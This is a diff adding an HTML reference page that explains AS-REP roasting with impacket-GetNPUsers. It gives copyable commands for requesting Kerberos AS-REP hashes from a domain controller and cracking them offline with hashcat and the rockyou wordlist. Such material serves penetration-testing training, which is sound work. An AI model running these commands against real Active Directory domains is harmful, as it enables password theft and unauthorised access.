@@ -1,0 +1,61 @@
+<section class="page active prose-page">
+  <h1>Using impacket-GetNPUsers</h1>
+  <p class="intro">
+    impacket-GetNPUsers identifies Active Directory accounts with Kerberos pre-authentication disabled and requests
+    AS-REP messages from the Domain Controller. The returned Kerberos data can be cracked offline to recover user
+    passwords.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Advantages</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">
+    Does not require valid credentials when allowed, supports offline password cracking, and generates minimal network
+    traffic.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Disadvantages</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">
+    Requires Kerberos pre-authentication to be disabled and can still be detected.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Use Authenticated User To Perform AS-REP Roasting</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Crack Session Key Use Hashcat</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title section-title-sub">
+    <span></span>
+    <h2>Resources</h2>
+    <span></span>
+  </div>
+
+  <div class="resource-links">
+    <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" target="_blank" rel="noreferrer">impacket-GetNPUsers</a>
+  </div>
+</section>
